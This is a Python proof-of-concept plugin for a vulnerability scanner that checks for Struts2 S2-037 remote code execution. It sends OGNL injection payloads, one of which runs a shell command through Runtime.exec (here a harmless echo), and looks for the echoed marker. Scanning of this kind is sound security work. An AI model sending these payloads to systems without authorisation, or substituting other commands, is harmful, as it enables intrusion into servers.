#!/usr/bin/env python3
# @Time    : 2020-04-09
# @Author  : caicai
# @File    : poc_struts2_037.py


import copy,random,re
from myscan.lib.helper.request import request
from myscan.lib.core.common import get_random_num,get_random_str
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.parse.response_parser import response_parser
from myscan.config import scan_set


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "Struts2-037"
        self.vulmsg = "Struts2-037远程代码执行"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 添加限定条件
        if self.dictdata.get("url").get("extension").lower() not in ["", "do", "action", ""]:
            return
        headers=copy.deepcopy(self.dictdata.get("request").get("headers"))
        random_str = get_random_str(6)

        payloads = [
            r"%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=7556&command=echo%20"+random_str,
            r"%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.print(%23parameters.content%5B0%5D),%23wr.print(%23parameters.content%5B1%5D),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=<Struts2-vuln-&content=Check>"
        ]
        checks=[
            random_str,
            "<Struts2-vuln-Check>"
        ]
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        for payload in payloads:
            req={
                "url":self.url+payload,
                "method":"GET",
                "headers":headers,
            }
            r = request(**req)
            if r != None:
                for check in checks:
                    if check==random_str:
                        if re.search(("[^(echo)][^ (%20)]{}|^\s*{}\s*$".format(random_str, random_str)).encode(), r.content):
                            self.save(r)
                            return
                    else:
                        if check.encode() in r.content:
                            self.save(r)
                            return

    def save(self,r):
        parser_ = response_parser(r)
        self.result.append({
            "name": self.name,
            "url": self.url,
            "level": self.level,  # 0:Low  1:Medium 2:High
            "detail": {
                "vulmsg": self.vulmsg,
                "request": parser_.getrequestraw(),
                "response": parser_.getresponseraw(),
            }
        })
